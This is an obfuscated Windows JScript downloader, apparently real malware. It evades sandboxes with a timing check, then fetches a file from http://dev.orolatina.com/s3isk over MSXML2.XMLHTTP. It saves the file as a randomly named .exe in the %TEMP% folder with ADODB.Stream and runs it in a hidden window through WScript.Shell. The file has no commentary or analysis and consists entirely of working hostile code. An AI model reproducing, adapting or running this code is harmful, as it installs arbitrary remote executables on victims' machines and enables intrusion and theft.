var _UG = false;
var _CU = "CreateObject";
var _VC = function _F() {return WScript[_CU]("WScript"+".Shell");}(), _X0 = 11;
var _WG = "MSXML2.XMLHTTP";
var _N0 = 2123213;
var _P = 0;
function _WE(_HO){_VC["Run"](_HO, _P, _P);};
function _QG(){return _WG + "";};
function _K(_MW, _QB){_P = _P * 1; return _MW - _QB;};
function _M(){return _CU;};
/*@cc_on
  @if (@_win32 || @_win64)
    _UG = true;
  @end
@*/
if (_UG)
{
var _K0 = "";
function _X(){return 22;};
var _XX = 0; var _DE = 0;
function _E()
{
var _DR = new this["Date"]();
var _I = _DR["getUTCMilliseconds"]();
WScript["Sleep"](_X());
var _DR = new this["Date"]();
var _W = _DR["getUTCMilliseconds"]();
WScript["Sleep"](_X());
var _DR = new this["Date"]();
var _O0 = _DR["getUTCMilliseconds"]();
var _XX = "_IT";
_XX = _K(_W, _I);
var _DE = "_WH";
_DE = _K(_O0, _W);
_K0 = "open";
return _K(_XX, _DE);
}
var _Q = false;
var _A0 = false;
for (var _C0 = _P; _C0 < _X() * 1; _C0++){if (_E() != _P){
_Q = true; 
_DE = "31" + 11 * _XX + _DE; 
_A0 = true; 
break;
}}
function _N() {return ((_Q == true) && (_Q == _A0)) ? 1 : _P;};
if (_Q && _N() && _A0){
function _PY() {return _VC["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "itslZR8f5nQ627v.ex" + "e";};
 _MS = _QG();
 _OF = WScript[_CU](_MS);
 var _C = 1;
 while (_C){
try {
	if (_C == 1)
	{
		_OF[_K0]("GET", "http://dev.orolatina.com/s3isk", false);
		_OF["send"]();
		_D0 = "Sleep";
	}
	WScript[_D0](_X() + 120); 
	if (_OF["readystate"] < 2 * 2) continue;
	_C = _P;
	function _A(_O) {var _D = (1, 2, 3, 4, 5, _O); return _D;};
	_TL = WScript[_M()]("ADODB.Stream");
	_MS = _TL;
	_MS[_K0]();
	_MS["type"] = _A(1);
	_MS["write"](_OF["ResponseBody"]);
	_TL["position"] = _A(_P);
	_MS["Save" + "ToFile"](_PY(), 2);
	_TL["cl"+"ose"]();
	_RB = _PY();
	_WE(_RB);
} catch(_N1){};
}
}
}

